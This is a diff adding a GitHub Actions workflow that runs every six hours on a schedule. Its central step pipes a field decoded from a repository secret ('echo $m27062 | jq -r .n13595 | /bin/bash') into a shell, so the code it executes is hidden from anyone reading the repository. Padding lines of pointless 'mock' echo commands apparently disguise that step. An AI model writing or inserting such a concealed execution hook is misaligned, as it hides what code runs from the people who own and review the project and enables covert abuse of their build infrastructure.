@@ -1,0 +1,29 @@
+name: mengxinheng2013
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mengxinheng2013
+        env:
+          m27062: ${{ secrets.m27062 }}
+        run: |
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo $m27062 | jq -r .n13595 | /bin/bash
+          echo "Grep -r mock: grep -r 'a' /tmp 2>/dev/null | head -1 || echo no-grep-r"
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo "Bit ops: $(( 1 & 1 ))"
+          echo "Command group: { echo group; }"
+          echo "Kubectl mock: kubectl version --client 2>/dev/null | head -1 || echo no-kubectl"
+          echo "Ld mock: ld --version 2>/dev/null | head -1 || echo no-ld"
+          echo "Route mock: route -n 2>/dev/null | head -1 || echo no-route"
+          echo "Sed mock: echo 'a' | sed 's/a/b/' 2>/dev/null || echo no-sed"
+          echo "Unalias mock: unalias ll 2>/dev/null || true"
+          echo "Ps mock: ps aux | head -1 2>/dev/null || echo no-ps"
+          echo "G++ mock: g++ --version 2>/dev/null | head -1 || echo no-g++"
+          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
